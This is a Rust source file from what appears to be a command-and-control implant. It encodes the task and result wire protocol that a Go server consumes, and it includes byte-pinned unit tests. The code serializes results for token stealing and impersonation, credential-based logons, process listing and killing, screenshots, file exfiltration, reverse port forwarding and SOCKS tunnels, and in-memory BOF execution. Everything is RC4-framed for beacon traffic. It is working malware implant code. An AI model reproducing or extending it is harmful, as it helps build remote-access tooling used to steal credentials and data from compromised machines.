/// TOKEN_PRIVS result: `int count`, then per entry `byte enabled || array name`.
pub fn push_token_privs_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_TOKEN_PRIVS) && w.u32(count)
}

pub fn push_token_privs_entry(w: &mut Writer, enabled: bool, name: &[u8]) -> bool {
    w.u8(u8::from(enabled)) && w.array(name)
}

/// EXFIL control ack: `int fileId || byte state` — the server renders
/// the stop/resume/cancel message.
pub fn push_exfil_result(w: &mut Writer, task_id: u32, file_id: u32, state: u8) -> bool {
    push_result_header(w, task_id, COMMAND_EXFIL) && w.u32(file_id) && w.u8(state)
}

/// UPLOAD ack: the header alone ("File successfully uploaded" server-side,
/// plus the file browser refresh).
pub fn push_upload_result(w: &mut Writer, task_id: u32) -> bool {
    push_result_header(w, task_id, COMMAND_UPLOAD)
}

pub fn push_plain_result(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
    push_result_header(w, task_id, command_id)
}

/// GETUID result: `byte elevated || array domain || array username` —
/// the server renders `You are 'DOMAIN\user'` (plus `(elevated)`).
pub fn push_getuid_result(
    w: &mut Writer,
    task_id: u32,
    elevated: bool,
    domain: &[u8],
    username: &[u8],
) -> bool {
    push_result_header(w, task_id, COMMAND_GETUID)
        && w.u8(u8::from(elevated))
        && w.array(domain)
        && w.array(username)
}

/// DISKS result header: `byte 1 || int count`, entries follow.
pub fn push_disks_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_DISKS) && w.u8(1) && w.u32(count)
}

/// One DISKS entry: `byte driveLetter || int driveType` (2 USB, 3 disk,
/// 4 network, 5 CD-ROM).
pub fn push_disks_entry(w: &mut Writer, letter: u8, drive_type: u32) -> bool {
    w.u8(letter) && w.u32(drive_type)
}

/// PS_LIST result header: `byte 1 || int count`, entries follow.
pub fn push_ps_list_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_PS_LIST) && w.u8(1) && w.u32(count)
}

/// One PS_LIST entry (words are the native 16-bit truncation of pids).
pub struct PsEntry<'a> {
    pub pid: u32,
    pub ppid: u32,
    pub session: u32,
    /// 0 x32, 1 x64, anything else unknown.
    pub arch: u8,
    pub elevated: bool,
    pub domain: &'a [u8],
    pub username: &'a [u8],
    pub name: &'a [u8],
}

/// `word pid || word ppid || word session || byte arch || byte elevated
/// || array domain || array username || array processName`.
pub fn push_ps_entry(w: &mut Writer, e: &PsEntry) -> bool {
    w.u16(e.pid as u16)
        && w.u16(e.ppid as u16)
        && w.u16(e.session as u16)
        && w.u8(e.arch)
        && w.u8(u8::from(e.elevated))
        && w.array(e.domain)
        && w.array(e.username)
        && w.array(e.name)
}

/// PS_KILL result: `int pid` — the server renders `Process %d killed`.
pub fn push_ps_kill_result(w: &mut Writer, task_id: u32, pid: u32) -> bool {
    push_result_header(w, task_id, COMMAND_PS_KILL) && w.u32(pid)
}

/// PS_RUN result (native CmdPsRun): `int pid || byte isOutput || array
/// prog` — the server renders "Program %v started with PID %d".
pub fn push_ps_run_result(
    w: &mut Writer,
    task_id: u32,
    pid: u32,
    output: bool,
    prog: &[u8],
) -> bool {
    push_result_header(w, task_id, COMMAND_PS_RUN)
        && w.u32(pid)
        && w.u8(u8::from(output))
        && w.array(prog)
}

/// JOB record with drained output (native JobsController):
/// `byte type || byte RUNNING || array data`.
pub fn push_job_output(w: &mut Writer, job_id: u32, job_type: u8, state: u8, data: &[u8]) -> bool {
    push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state) && w.array(data)
}

/// JOB lifecycle record without payload (finished / killed):
/// `byte type || byte state`.
pub fn push_job_end(w: &mut Writer, job_id: u32, job_type: u8, state: u8) -> bool {
    push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state)
}

/// JOB end record with the exit code (shell FINISHED — the terminal
/// closes with the status): `byte type || byte state || int errorCode`.
pub fn push_job_end_code(w: &mut Writer, job_id: u32, job_type: u8, state: u8, code: u32) -> bool {
    push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state) && w.u32(code)
}

/// TUNNEL_START_TCP result: `int sub || int result` — the server resumes
/// the tunnel connection on 0, closes on 1, halts with the SOCKS5
/// mapping on a WSA error code (10061 = connection refused).
pub fn push_tunnel_start_result(w: &mut Writer, channel_id: u32, result: u32) -> bool {
    push_result_header(w, channel_id, COMMAND_TUNNEL_START_TCP) && w.u32(0) && w.u32(result)
}

/// TUNNEL_WRITE_TCP result: `array data` (data read from the socket).
pub fn push_tunnel_write_result(w: &mut Writer, channel_id: u32, data: &[u8]) -> bool {
    push_result_header(w, channel_id, COMMAND_TUNNEL_WRITE_TCP) && w.array(data)
}

/// TUNNEL_CLOSE result: `int 0 || int 0` (the peer closed).
pub fn push_tunnel_close_result(w: &mut Writer, channel_id: u32) -> bool {
    push_result_header(w, channel_id, COMMAND_TUNNEL_CLOSE) && w.u32(0) && w.u32(0)
}

/// TUNNEL_ACCEPT result (rportfwd): `int newChannelId` — the accepted
/// connection rides its own channel from now on.
pub fn push_tunnel_accept_result(w: &mut Writer, tunnel_id: u32, new_channel_id: u32) -> bool {
    push_result_header(w, tunnel_id, COMMAND_TUNNEL_ACCEPT) && w.u32(new_channel_id)
}

/// TUNNEL_REVERSE result: `int sub || int result` (1 = bound OK).
pub fn push_tunnel_reverse_result(w: &mut Writer, tunnel_id: u32, result: u32) -> bool {
    push_result_header(w, tunnel_id, COMMAND_TUNNEL_REVERSE) && w.u32(0) && w.u32(result)
}

/// TUNNEL_PAUSE/RESUME ack: the header alone.
pub fn push_tunnel_flag_result(w: &mut Writer, channel_id: u32, command_id: u32) -> bool {
    push_result_header(w, channel_id, command_id)
}

/// JOB_LIST result: `int count`, then `int jobId || word type || word pid`
/// per entry.
pub fn push_jobs_list_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_JOB_LIST) && w.u32(count)
}

pub fn push_jobs_list_entry(w: &mut Writer, job_id: u32, job_type: u8, pid: u32) -> bool {
    w.u32(job_id) && w.u16(job_type as u16) && w.u16(pid as u16)
}

/// JOBS_KILL result: `byte found || int jobId` — the server renders
/// "Job %v mark as Killed" / "Job %v not found".
pub fn push_jobs_kill_result(w: &mut Writer, task_id: u32, found: bool, job_id: u32) -> bool {
    push_result_header(w, task_id, COMMAND_JOBS_KILL) && w.u8(u8::from(found)) && w.u32(job_id)
}

/// Result record header: `u32 BE taskId || u32 BE commandId`.
pub fn push_result_header(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
    w.u32(task_id) && w.u32(command_id)
}

/// Win32 failure report: `COMMAND_ERROR || u32 BE errorCode` — the server
/// renders `Error [code]: <message>`.
pub fn push_error_result(w: &mut Writer, task_id: u32, error_code: u32) -> bool {
    push_result_header(w, task_id, COMMAND_ERROR) && w.u32(error_code)
}

/// PWD/CD result: `array path` (the new/current working directory).
pub fn push_path_result(w: &mut Writer, task_id: u32, command_id: u32, path: &[u8]) -> bool {
    push_result_header(w, task_id, command_id) && w.array(path)
}

/// CAT result: `array path || array content`.
pub fn push_cat_result(w: &mut Writer, task_id: u32, path: &[u8], content: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_CAT) && w.array(path) && w.array(content)
}

/// LS result header: `byte 1 || array rootPath || int count` — the entries
/// follow as `push_ls_entry` records.
pub fn push_ls_result_header(w: &mut Writer, task_id: u32, root: &[u8], count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_LS) && w.u8(1) && w.array(root) && w.u32(count)
}

/// One LS entry: `byte isDir || long size || int unixDate || array name`.
pub fn push_ls_entry(w: &mut Writer, is_dir: bool, size: u64, date: u32, name: &[u8]) -> bool {
    w.u8(u8::from(is_dir)) && w.u64(size) && w.u32(date) && w.array(name)
}

/// Append the sleep-acknowledgement record the server's ProcessData expects
/// for COMMAND_PROFILE: `u32 BE taskId || u32 BE 21 || u32 BE 1 || sec || jitter`.
pub fn push_sleep_result(w: &mut Writer, task_id: u32, sec: u32, jitter_pct: u32) -> bool {
    w.u32(task_id) && w.u32(COMMAND_PROFILE) && w.u32(1) && w.u32(sec) && w.u32(jitter_pct)
}

/// Wrap the packed results in the server's body frame
/// (`flags:0 || u32 LE origLen || data` — `decompressZlibData` passes the
/// payload through uncompressed when the flag is clear). `out` must fit
/// `5 + packed.len()`; the caller RC4-encrypts `out` with the session key.
pub fn wrap_results_frame(packed: &[u8], out: &mut [u8]) -> Option<usize> {
    if out.len() < 5 + packed.len() {
        return None;
    }
    out[0] = 0;
    // Manual copies (copy_from_slice lowers to memcpy — the
    // compiler_builtins rule: no reference may leave the blob code).
    let len = packed.len() as u32;
    let le = len.to_le_bytes();
    let mut i = 0;
    while i < 4 {
        out[1 + i] = le[i];
        i += 1;
    }
    let mut i = 0;
    while i < packed.len() {
        out[5 + i] = packed[i];
        i += 1;
    }
    Some(5 + packed.len())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::beat::BeatData;
    use std::vec::Vec;

    fn test_beat<'a>() -> BeatData<'a> {
        BeatData {
            sleep_sec: 60,
            jitter_pct: 10,
            killdate: 1_767_225_600,
            workingtime: 0,
            acp: 1252,
            oemcp: 437,
            gmt_offset: 2,
            pid: 0x1234,
            tid: 0x5678,
            build_number: 26100,
            major: 10,
            minor: 0,
            internal_ip: 0x0A00_020F,
            flags: 0b11,
            session_key: &[0x42u8; 32],
            domain: b"MEGACORP",
            computer: b"WIN-TEST",
            username: b"nariod",
            process: b"testhost.exe",
        }
    }

    fn hex(s: &str) -> Vec<u8> {
        (0..s.len() / 2)
            .map(|i| u8::from_str_radix(&s[2 * i..2 * i + 2], 16).unwrap())
            .collect()
    }

    /// RFC 4648 vectors (exactly Go's base64.StdEncoding, padding included).
    #[test]
    fn base64_rfc4648() {
        for (plain, enc) in [
            ("", ""),
            ("f", "Zg=="),
            ("fo", "Zm8="),
            ("foo", "Zm9v"),
            ("foob", "Zm9vYg=="),
            ("fooba", "Zm9vYmE="),
            ("foobar", "Zm9vYmFy"),
        ] {
            let mut out = [0u8; 16];
            let n = base64_encode(plain.as_bytes(), &mut out).unwrap();
            assert_eq!(&out[..n], enc.as_bytes(), "plain={plain:?}");
        }
    }

    #[test]
    fn base64_rejects_small_buffer() {
        let mut out = [0u8; 3];
        assert!(base64_encode(b"foobar", &mut out).is_none());
    }

    /// Full beat envelope, byte-pinned against the Go reference generator
    /// (crypto/rc4 + base64.StdEncoding, listener framing wm||id||beat).
    #[test]
    fn beat_header_matches_go_reference() {
        const GO_B64: &str = "sqA+2JlPpyMG25f6Dt0qRbokOF/yt0Lui3qkbPsl11QjOkt6xAniEoFVMtiyTflKxdcRzHdzsIul3kXhS4VpJME3ITl2pKpY/PBDAJmojku8ckBnBn+VpBpu6yAfzyDjRo+pEJ/JYks11us8fFcvG3BFl0UX1KVvqlxGDyhZ87xlng==";
        let mut scratch = [0u8; 512];
        let mut out = [0u8; 720];
        let n = beat_header(
            &test_beat(),
            &[0u8, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15],
            0x5b3c_7e21,
            0xdead_beef,
            &mut scratch,
            &mut out,
        )
        .unwrap();
        assert_eq!(&out[..n], GO_B64.as_bytes());
    }

    #[test]
    fn beat_header_rejects_small_scratch() {
        let mut scratch = [0u8; 16];
        let mut out = [0u8; 720];
        assert!(beat_header(&test_beat(), &[1u8; 16], 1, 2, &mut scratch, &mut out).is_none());
    }

    /// Response page: extract, session-decrypt, parse the task pack — the
    /// exact bytes the Go generator built through PackTasks.
    #[test]
    fn task_pack_from_go_reference() {
        const PREPEND: &[u8] = b"{\"result\":\"";
        const APPEND: &[u8] = b"\"}";
        let page =
            hex("7b22726573756c74223a22017f56c8611e546fb87839e4a822504871342c64a66f29cb227d");

        let payload = extract_payload(&page, PREPEND, APPEND).unwrap();
        let mut decrypted = payload.to_vec();
        Rc4::new(&[0x42u8; 32]).crypt_in_place(&mut decrypted);

        // PackTasks trailer: u32 LE total size, then [data || u32 LE taskId].
        let mut r = Reader::new(&decrypted);
        let total = r.u32_le().unwrap() as usize;
        assert_eq!(total, 20, "pack = 16 bytes data + 4 bytes taskId");
        assert!(total <= r.remaining());

        let (task, id) = parse_task(&mut r).unwrap();
        assert_eq!(
            task,
            Task::Sleep {
                sec: 60,
                jitter_pct: 10
            }
        );
        assert_eq!(id, 0x1122_3344);
        assert_eq!(r.remaining(), decrypted.len() - 4 - total);
    }

    #[test]
    fn empty_payload_is_no_tasks() {
        let page = b"{\"result\":\"\"}";
        let payload = extract_payload(page, b"{\"result\":\"", b"\"}").unwrap();
        assert!(payload.is_empty());
    }

    #[test]
    fn payload_extraction_rejects_foreign_pages() {
        assert!(extract_payload(b"other page", b"{\"result\":\"", b"\"}").is_none());
        assert!(extract_payload(b"{\"result\":\"", b"{\"result\":\"", b"\"}").is_none());
    }

    #[test]
    fn parse_task_terminate() {
        // COMMAND_TERMINATE (10), exit method 1 (kill thread), taskId 1 —
        // the layout the server's CreateCommand emits for "terminate thread".
        let bytes = [10u8, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0];
        let mut r = Reader::new(&bytes);
        assert_eq!(parse_task(&mut r), Some((Task::Terminate, 1)));
        assert_eq!(r.remaining(), 0);
    }

    /// File-command task records, byte-pinned against the Go reference
    /// (PackArray semantics: int u32 LE, string u32 LE len-incl-NUL).
    #[test]
    fn parse_task_file_commands_from_go_reference() {
        // cd "C:\Test", taskId 0x11223344.
        let cd = hex("0800000008000000433a5c546573740044332211");
        let mut r = Reader::new(&cd);
        let (task, id) = parse_task(&mut r).unwrap();
        assert!(matches!(task, Task::Cd { path_len: 7, .. }));
        assert_eq!(task.path(), b"C:\\Test");
        assert_eq!(id, 0x1122_3344);
        assert_eq!(r.remaining(), 0);

        // pwd, taskId 1.
        let pwd = hex("0400000001000000");
        let mut r = Reader::new(&pwd);
        assert_eq!(parse_task(&mut r), Some((Task::Pwd, 1)));
        assert_eq!(r.remaining(), 0);

        // cat "C:\flag.txt", taskId 7.
        let cat = hex("180000000c000000433a5c666c61672e7478740007000000");
        let mut r = Reader::new(&cat);
        let (task, id) = parse_task(&mut r).unwrap();
        assert!(matches!(task, Task::Cat { path_len: 11, .. }));
        assert_eq!(task.path(), b"C:\\flag.txt");
        assert_eq!(id, 7);
        assert_eq!(r.remaining(), 0);
    }

    /// Result records the server's ProcessData parses (BE arrays/ints).
    #[test]
    fn result_records_match_native_processdata_layout() {
        // pwd result: taskId 1 || COMMAND_PWD || array "C:\Test".
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(push_path_result(&mut w, 1, COMMAND_PWD, b"C:\\Test"));
        let expected = hex("000000010000000400000007433a5c54657374");
        assert_eq!(&w.written_bytes()[..expected.len()], &expected[..]);

        // error result: taskId 2 || COMMAND_ERROR || code 5 (access denied).
        let mut ebuf = [0u8; 64];
        let mut w = Writer::new(&mut ebuf);
        assert!(push_error_result(&mut w, 2, 5));
        let expected = hex("000000021111ffff00000005");
        assert_eq!(&w.written_bytes()[..expected.len()], &expected[..]);

        // ls result: taskId 3 || COMMAND_LS || 1 || array root || count 1
        // || entry(dir, 0, 42, "tmp").
        let mut lbuf = [0u8; 128];
        let mut w = Writer::new(&mut lbuf);
        assert!(push_ls_result_header(&mut w, 3, b"C:\\t", 1));
        assert!(push_ls_entry(&mut w, true, 0, 42, b"tmp"));
        let expected =
            hex("000000030000000e0100000004433a5c74000000010100000000000000000000002a00000003");
        let got = w.written_bytes();
        // The prefix pins the layout up to the entry name.
        assert_eq!(&got[..expected.len()], &expected[..]);
        assert_eq!(&got[expected.len()..expected.len() + 3], b"tmp");
        assert_eq!(got.len(), expected.len() + 3);
    }

    /// Every path-carrying variant must expose its argument — a variant
    /// missing from `path()`/`dst()` silently produces empty API calls
    /// (caught first against the live server: `Directory '' created`).
    #[test]
    fn task_path_accessors_cover_every_variant() {
        let mk = |bytes: &[u8]| {
            let mut buf = [0u8; PATH_CAP];
            buf[..bytes.len()].copy_from_slice(bytes);
            (bytes.len() as u16, buf)
        };
        let (l, p) = mk(b"C:\\dir");
        let (sl, sd) = mk(b"C:\\src.txt");
        let (dl, dd) = mk(b"C:\\dst.txt");

        let cases = [
            (
                Task::Cd {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Ls {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Cat {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Mkdir {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Rm {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Download {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Upload {
                    memory_id: 7,
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Cp {
                    src_len: sl,
                    src: sd,
                    dst_len: dl,
                    dst: dd,
                },
                b"C:\\src.txt".as_slice(),
            ),
            (
                Task::Mv {
                    src_len: sl,
                    src: sd,
                    dst_len: dl,
                    dst: dd,
                },
                b"C:\\src.txt".as_slice(),
            ),
        ];
        for (task, want) in cases {
            assert_eq!(task.path(), want, "path() of {task:?}");
        }
        assert_eq!(
            Task::Cp {
                src_len: sl,
                src: sd,
                dst_len: dl,
                dst: dd
            }
            .dst(),
            b"C:\\dst.txt".as_slice()
        );
        assert_eq!(
            Task::Mv {
                src_len: sl,
                src: sd,
                dst_len: dl,
                dst: dd
            }
            .dst(),
            b"C:\\dst.txt".as_slice()
        );
    }

    /// Upload task from the Go reference (PackArray int+int+string, the
    /// createTaskCommandSaveMemory flow): `[33, memoryId, fileName]`.
    #[test]
    fn parse_task_upload_from_go_reference() {
        // upload, memoryId 0x766ad211, "C:\uploaded.txt", taskId 1.
        let bytes = hex("2100000011d26a7610000000433a5c75706c6f616465642e7478740001000000");
        let mut r = Reader::new(&bytes);
        let (task, id) = parse_task(&mut r).unwrap();
        match task {
            Task::Upload {
                memory_id,
                path_len,
                ..
            } => {
                assert_eq!(memory_id, 0x766A_D211);
                assert_eq!(path_len, 15);
            }
            _ => panic!("wrong variant: {task:?}"),
        }
        assert_eq!(task.path(), b"C:\\uploaded.txt");
        assert_eq!(id, 1);
        assert_eq!(r.remaining(), 0);
    }

    /// A SAVEMEMORY chunk from the Go reference (createTaskCommandSaveMemory).
    #[test]
    fn parse_save_memory_from_go_reference() {
        // [0x2321, memoryId 5, total 10, chunkLen 10, "specter-rs"] + taskId 7
        let bytes = hex("21230000050000000a0000000a000000737065637465722d727307000000");
        let mut r = Reader::new(&bytes);
        let (memory_id, expected, chunk) = parse_save_memory(&mut r).unwrap();
        assert_eq!(memory_id, 5);
        assert_eq!(expected, 10);
        assert_eq!(chunk, b"specter-rs");
        assert_eq!(r.remaining(), 0);
    }

    /// `execute bof` task from the native CreateCommand semantics
    /// (PackArray: {50, bool, "go", int len, bytes, int len, bytes}).
    #[test]
    fn parse_exec_bof_from_native_reference() {
        // async=true, entry "go", BOF bytes de ad be ef, params 41 42,
        // taskId 7.
        let bytes = hex("320000000103000000676f0004000000deadbeef02000000414207000000");
        let mut r = Reader::new(&bytes);
        let task = parse_exec_bof(&mut r).unwrap();
        assert!(task.async_flag);
        assert_eq!(task.entry_name(), b"go");
        assert_eq!(task.bof, &[0xde, 0xad, 0xbe, 0xef]);
        assert_eq!(task.args, b"AB");
        assert_eq!(task.task_id, 7);
        assert_eq!(r.remaining(), 0);

        // Sync run, empty params, taskId 0x11223344.
        let bytes = hex("320000000003000000676f0004000000deadbeef0000000044332211");
        let mut r = Reader::new(&bytes);
        let task = parse_exec_bof(&mut r).unwrap();
        assert!(!task.async_flag);
        assert!(task.args.is_empty());
        assert_eq!(task.task_id, 0x1122_3344);
    }

    #[test]
    fn parse_exec_bof_rejects_truncation_and_wrong_command() {
        // Not COMMAND_EXEC_BOF: refused (the dispatcher peeks first).
        let bytes = hex("210000000103000000676f00000000000000000");
        let mut r = Reader::new(&bytes);
        assert!(parse_exec_bof(&mut r).is_none());
        // Truncated mid-image.
        let bytes = hex("320000000103000000676f0004000000dead");
        let mut r = Reader::new(&bytes);
        assert!(parse_exec_bof(&mut r).is_none());
        // Oversized entry name.
        let bytes = hex("320000000141000000");
        let mut r = Reader::new(&bytes);
        assert!(parse_exec_bof(&mut r).is_none());
    }

    /// Lifecycle and output records against the native ProcessData layout
    /// (`u32 BE taskId || u32 BE commandId || ...`).
    #[test]
    fn bof_records_match_native_processdata_layout() {
        // Async started: taskId 0x11223344, state 1 (Completed=false).
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(push_bof_lifecycle(&mut w, 0x1122_3344, BOF_STATE_STARTED));
        let expected = hex("112233440000003201");
        assert_eq!(w.written_bytes(), &expected[..]);

        // Finished: state 2 (Completed=true).
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(push_bof_lifecycle(&mut w, 0x1122_3344, BOF_STATE_FINISHED));
        let expected = hex("112233440000003202");
        assert_eq!(w.written_bytes(), &expected[..]);

        // UTF8 output: taskId 1, type CALLBACK_OUTPUT_UTF8, array "hello".
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(push_bof_output(&mut w, 1, CALLBACK_OUTPUT_UTF8, b"hello"));
        let expected = hex("0000000100000033000000200000000568656c6c6f");
        assert_eq!(w.written_bytes(), &expected[..]);

        // Symbol error: taskId 2, type BOF_ERROR_SYMBOL, array "BeaconPrintf".
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(push_bof_output(
            &mut w,
            2,
            BOF_ERROR_SYMBOL,
            b"BeaconPrintf"
        ));
        let expected = hex("0000000200000033000001020000000c426561636f6e5072696e7466");
        assert_eq!(w.written_bytes(), &expected[..]);
    }

    #[test]
    fn parse_task_rejects_unknown_command() {
        let bytes = [99u8, 0, 0, 0, 1, 0, 0, 0];
        let mut r = Reader::new(&bytes);
        assert!(parse_task(&mut r).is_none());
    }

    #[test]
    fn parse_task_screenshot() {
        // "screenshot" (44) has no arguments: u32 LE 44 || u32 LE taskId.
        let bytes = [44u8, 0, 0, 0, 0x21, 0x43, 0, 0];
        let mut r = Reader::new(&bytes);
        assert_eq!(parse_task(&mut r), Some((Task::Screenshot, 0x4321)));
        assert_eq!(r.remaining(), 0);
    }

    /// The tkn task family (PackArray semantics: int u32 LE, string
    /// u32 LE len-incl-NUL).
    #[test]
    fn parse_task_token_family() {
        // steal: 52 || pid 1337 || taskId 1.
        let bytes = [52u8, 0, 0, 0, 57, 5, 0, 0, 1, 0, 0, 0];
        let mut r = Reader::new(&bytes);
        assert_eq!(
            parse_task(&mut r),
            Some((Task::TokenSteal { pid: 1337 }, 1))
        );

        // make: 53 || logonType 2 || "MEGACORP\0" || "doria\0" || "pw\0" || taskId 2.
        let bytes = [
            53, 0, 0, 0, // COMMAND_TOKEN_MAKE
            2, 0, 0, 0, // logonType (interactive)
            9, 0, 0, 0, b'M', b'E', b'G', b'A', b'C', b'O', b'R', b'P', 0, // domain
            6, 0, 0, 0, b'd', b'o', b'r', b'i', b'a', 0, // user
            3, 0, 0, 0, b'p', b'w', 0, // pass
            2, 0, 0, 0, // taskId
        ];
        let mut r = Reader::new(&bytes);
        let (task, id) = parse_task(&mut r).unwrap();
        let Task::TokenMake {
            logon_type,
            domain_len,
            domain,
            user_len,
            user,
            ..
        } = task
        else {
            panic!("expected TokenMake");
        };
        assert_eq!(id, 2);
        assert_eq!(logon_type, 2);
        assert_eq!(&domain[..domain_len as usize], b"MEGACORP");
        assert_eq!(&user[..user_len as usize], b"doria");

        // impersonate / revert / list / remove / getuid / privs.
        let bytes = [54, 0, 0, 0, 9, 0, 0, 0, 3, 0, 0, 0];
        assert_eq!(
            parse_task(&mut Reader::new(&bytes)),
            Some((Task::TokenImpersonate { token_id: 9 }, 3))
        );
        let bytes = [55, 0, 0, 0, 4, 0, 0, 0];
        assert_eq!(
            parse_task(&mut Reader::new(&bytes)),
            Some((Task::TokenRevert, 4))
        );
        let bytes = [56, 0, 0, 0, 5, 0, 0, 0];
        assert_eq!(
            parse_task(&mut Reader::new(&bytes)),
            Some((Task::TokenList, 5))
        );
        let bytes = [57, 0, 0, 0, 9, 0, 0, 0, 6, 0, 0, 0];
        assert_eq!(
            parse_task(&mut Reader::new(&bytes)),
            Some((Task::TokenRemove { token_id: 9 }, 6))
        );
        let bytes = [58, 0, 0, 0, 7, 0, 0, 0];
        assert_eq!(
            parse_task(&mut Reader::new(&bytes)),
            Some((Task::TokenGetuid, 7))
        );
        let bytes = [59, 0, 0, 0, 8, 0, 0, 0];
        assert_eq!(
            parse_task(&mut Reader::new(&bytes)),
            Some((Task::TokenPrivs, 8))
        );
    }

    /// Token results, byte-pinned (BE records, array = u32 BE len).
    #[test]
    fn token_records_pin_the_wire() {
        let mut buf = [0u8; 128];
        let mut w = Writer::new(&mut buf);
        assert!(push_token_steal_result(
            &mut w,
            0x1122_3344,
            1,
            1337,
            b"MEGACORP",
            b"doria"
        ));
        assert!(push_token_make_result(&mut w, 0x1122_3344, 2));
        assert!(push_token_getuid_result(
            &mut w,
            0x1122_3344,
            b"MEGACORP\\doria"
        ));
        assert!(push_token_privs_header(&mut w, 0x1122_3344, 1));
        assert!(push_token_privs_entry(&mut w, true, b"SeDebugPrivilege"));
        let expected = hex(concat!(
            "11223344", // taskId BE
            "00000034", // COMMAND_TOKEN_STEAL (52) BE
            "00000001", // tokenId BE
            "00000539", // pid 1337 BE
            "00000008",
            "4d454741434f5250", // domain
            "00000005",
            "646f726961",               // user
            "112233440000003500000002", // taskId BE || 53 BE || tokenId 2
            "112233440000003a",         // taskId BE || 58 BE
            "0000000e",
            "4d454741434f52505c646f726961", // DOMAIN\User
            "112233440000003b00000001",     // taskId BE || 59 BE || count 1
            "01",                           // enabled
            "00000010",
            "5365446562756750726976696c656765", // SeDebugPrivilege
        ));
        assert_eq!(w.written_bytes(), &expected[..]);
    }

    /// Screenshot stream records, byte-pinned: START carries the total BMP
    /// size (u64 BE), CONTINUE an array chunk, FINISH nothing — the server
    /// reassembles by task id and closes on FINISH.
    #[test]
    fn screenshot_records_pin_the_wire() {
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(push_screenshot_start(
            &mut w,
            0x1122_3344,
            0x0102_0304_0506_0708
        ));
        assert!(push_screenshot_continue(&mut w, 0x1122_3344, b"BM\x36"));
        assert!(push_screenshot_finish(&mut w, 0x1122_3344));
        let expected = hex(concat!(
            "11223344",           // taskId BE
            "0000002c",           // COMMAND_SCREENSHOT (44) BE
            "01",                 // SCREENSHOT_START
            "0102030405060708",   // total BMP size BE
            "112233440000002c02", // taskId BE || 44 BE || SCREENSHOT_CONTINUE
            "00000003",           // array len BE
            "424d36",             // chunk bytes
            "112233440000002c03", // taskId BE || 44 BE || SCREENSHOT_FINISH
        ));
        assert_eq!(w.written_bytes(), &expected[..]);
    }

    /// Results body, byte-pinned against the Go generator: the framed pack
    /// (u32 BE size || record) inside the 5-byte listener frame, before RC4.
    #[test]
    fn results_body_matches_go_reference() {
        const GO_FRAME_HEX: &str = "0018000000000000181122334400000015000000010000003c0000000a";
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(begin_results(&mut w));
        assert!(push_sleep_result(&mut w, 0x1122_3344, 60, 10));
        assert!(finish_results(&mut w));
        let packed = w.written_bytes().to_vec();

        let mut framed = [0u8; 64];
        let n = wrap_results_frame(&packed, &mut framed).unwrap();
        assert_eq!(&framed[..n], &hex(GO_FRAME_HEX)[..]);
    }

    /// End-to-end symmetry with the Go server: our results body decrypts to
    /// what the generator's frame decrypts to.
    #[test]
    fn results_frame_round_trips_go_reference() {
        const GO_RESULTS_HEX: &str = "156756c8741e546fa1691bd7d02250486e342c64e35c0bda5ad57c8882";
        let go_body = hex(GO_RESULTS_HEX);
        let mut decrypted = go_body.clone();
        Rc4::new(&[0x42u8; 32]).crypt_in_place(&mut decrypted);

        // Server frame: flags 0, u32 LE origLen.
        assert_eq!(decrypted[0], 0);
        let orig_len =
            u32::from_le_bytes([decrypted[1], decrypted[2], decrypted[3], decrypted[4]]) as usize;
        assert_eq!(orig_len, decrypted.len() - 5);
        let mut r = Reader::new(&decrypted[5..]);
        let size = r.u32().unwrap();
        assert_eq!(size as usize, 4 + 20);
        let task_id = r.u32().unwrap();
        let command = r.u32().unwrap();
        let subop = r.u32().unwrap();
        let sec = r.u32().unwrap();
        let jitter = r.u32().unwrap();
        assert_eq!(task_id, 0x1122_3344);
        assert_eq!(command, COMMAND_PROFILE);
        assert_eq!(subop, 1);
        assert_eq!(sec, 60);
        assert_eq!(jitter, 10);
        assert_eq!(r.remaining(), 0);
    }
}
